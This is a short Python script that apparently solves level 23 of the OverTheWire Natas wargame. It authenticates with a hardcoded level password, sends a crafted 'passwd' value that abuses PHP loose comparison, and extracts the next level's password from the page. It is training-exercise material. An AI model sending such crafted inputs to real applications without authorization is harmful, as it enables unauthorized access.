#!/usr/bin/env python3

import requests
import re


req = requests.Session()


username = "natas23"
password = "D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE"
url = "http://%s.natas.labs.overthewire.org/" % username


req_get = req.get(url+"?passwd=11iloveyou",auth=(username,password),allow_redirects = False)
# print(req_get.text)
new_password = re.findall("Password: (.*)</pre>",req_get.text)
print(new_password[0])
